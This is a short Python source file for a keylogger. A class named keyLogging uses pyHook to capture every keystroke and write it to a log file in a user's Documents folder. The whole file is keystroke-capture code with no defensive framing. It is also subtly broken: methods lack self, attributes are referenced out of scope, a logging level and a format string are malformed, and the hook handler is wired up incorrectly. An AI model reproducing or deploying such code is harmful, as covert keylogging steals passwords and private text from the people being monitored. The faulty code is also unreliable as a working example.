import pyHook
import sys
import pythoncom
import logging

class keyLogging:

    file_log = "/Users/emodatt08/Documents/log.txt"

    def onKeyBoardEvent(event):
        logging.basicConfig(filename = file_log, level = logging.Debug, format = '%(messages) s')
        chr(event.Ascii)
        logging.log(10, chr(event.Ascii))
        return True

    def hooks(event):
        hooks_manager = pyHook.HookManager()
        hooks_manager.keyDown = onKeyBoardEvent(event)
        hooks_manager.PumpMessages()